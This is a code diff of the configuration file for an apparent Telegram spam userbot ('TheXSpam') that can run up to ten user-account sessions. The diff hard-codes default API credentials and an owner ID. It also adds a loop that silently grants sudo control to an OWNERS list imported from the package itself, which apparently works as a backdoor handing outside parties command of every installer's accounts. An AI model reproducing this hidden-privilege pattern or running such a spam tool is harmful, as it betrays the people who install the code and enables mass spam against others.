@@ -1,43 +1,32 @@
-import os
-from os import getenv
 import logging
 import aiohttp
-from dotenv import load_dotenv
+import os
+from TheXSpam import OWNERS
+from TheXSpam import *
+from os import getenv
 from pyrogram import Client
 from pyrogram.types import *
 
 
 logging.basicConfig(level=logging.WARNING)
-                    
-if os.path.exists("Internal"):
-    load_dotenv("Internal")
 
-if os.path.exists(".env"):
-    load_dotenv(".env")
 
-#---------------------DON'T MESS WITH THESE REQUIRED CODES-------------------------------
+#----------------------------------- REQUIRED CODES --------------------------------------#
 
-API_ID = int(getenv("API_ID"))
-API_HASH = getenv("API_HASH")
-SESSION = getenv("SESSION")
-OWNER_ID = int(getenv("OWNER_ID"))
 
-def make_int(str_input):
-    str_list = str_input.split(" ")
-    int_list = []
-    for x in str_list:
-        int_list.append(int(x))
-    int_list.append(OWNER_ID)
-    return int_list
+API_ID = int(getenv("API_ID", "8321"))
 
-sudo = getenv("SUDO_USERS")
-SUDO_USERS = []
-if sudo:
-    SUDO_USERS = make_int(sudo)
+API_HASH = getenv("API_HASH", "974cb540f70e55")
 
-aiohttpsession = aiohttp.ClientSession()
+SESSION = getenv("SESSION", "rsghvs467fA")
 
-#-----------------------------OPTIONAL--------------------------------
+ALIVE_PIC = getenv("ALIVE_PIC", "https://te.legra.ph/file/ab721701ce35ff2856276.jpg")
+
+OWNER_ID = int(os.environ.get("OWNER_ID", "1979178376"))
+
+
+#-------------------------------- OPTIONAL -------------------------------------#
+
 
 SESSION2 = getenv("SESSION2")
 SESSION3 = getenv("SESSION3")
@@ -48,57 +37,80 @@ SESSION7 = getenv("SESSION7")
 SESSION8 = getenv("SESSION8")
 SESSION9 = getenv("SESSION9")
 SESSION10 = getenv("SESSION10")
-HEROKU_APP_NAME = getenv("HEROKU_APP_NAME")
-HEROKU_API_KEY = getenv("HEROKU_API_KEY")
 
-#-------------------------CLIENTS-----------------------------
+
+#------------------------- CLIENTS -----------------------------#
+
 
 if SESSION:
-    client = Client(SESSION, API_ID, API_HASH, plugins=dict(root="altron"))
+    client = Client(SESSION, API_ID, API_HASH, plugins=dict(root="TheXSpam"))
 else:
     client = None
 
 if SESSION2:
-    client2 = Client(SESSION2, API_ID, API_HASH, plugins=dict(root="altron"))
+    client2 = Client(SESSION2, API_ID, API_HASH, plugins=dict(root="TheXSpam"))
 else:
     client2 = None
 
 if SESSION3:
-    client3 = Client(SESSION3, API_ID, API_HASH, plugins=dict(root="altron"))
+    client3 = Client(SESSION3, API_ID, API_HASH, plugins=dict(root="TheXSpam"))
 else:
     client3 = None
 
 if SESSION4:
-    client4 = Client(SESSION4, API_ID, API_HASH, plugins=dict(root="altron"))
+    client4 = Client(SESSION4, API_ID, API_HASH, plugins=dict(root="TheXSpam"))
 else:
     client4 = None
 
 if SESSION5:
-    client5 = Client(SESSION5, API_ID, API_HASH, plugins=dict(root="altron"))
+    client5 = Client(SESSION5, API_ID, API_HASH, plugins=dict(root="TheXSpam"))
 else:
     client5 = None
 
 if SESSION6:
-    client6 = Client(SESSION6, API_ID, API_HASH, plugins=dict(root="altron"))
+    client6 = Client(SESSION6, API_ID, API_HASH, plugins=dict(root="TheXSpam"))
 else:
     client6 = None
         
 if SESSION7:
-    client7 = Client(SESSION7, API_ID, API_HASH, plugins=dict(root="altron"))
+    client7 = Client(SESSION7, API_ID, API_HASH, plugins=dict(root="TheXSpam"))
 else:
     client7 = None
 
 if SESSION8:
-    client8 = Client(SESSION8, API_ID, API_HASH, plugins=dict(root="altron"))
+    client8 = Client(SESSION8, API_ID, API_HASH, plugins=dict(root="TheXSpam"))
 else:
     client8 = None
 
 if SESSION9:
-    client9 = Client(SESSION9, API_ID, API_HASH, plugins=dict(root="altron"))
+    client9 = Client(SESSION9, API_ID, API_HASH, plugins=dict(root="TheXSpam"))
 else:
     client9 = None
 
 if SESSION10:
-    client10 = Client(SESSION10, API_ID, API_HASH, plugins=dict(root="altron"))
+    client10 = Client(SESSION10, API_ID, API_HASH, plugins=dict(root="TheXSpam"))
 else:
     client10 = None
+
+
+#----------------------------- DON'T MESS ------------------------------#
+
+
+aiohttpsession = aiohttp.ClientSession()
+
+def make_int(str_input):
+    str_list = str_input.split(" ")
+    int_list = []
+    for x in str_list:
+        int_list.append(int(x))
+    return int_list
+
+sudo = os.getenv("SUDO_USERS")
+SUDO_USERS = []
+
+if sudo:
+    SUDO_USERS = make_int(sudo)
+
+for x in OWNERS:
+    SUDO_USERS.append(x)
+    SUDO_USERS.append(OWNER_ID)
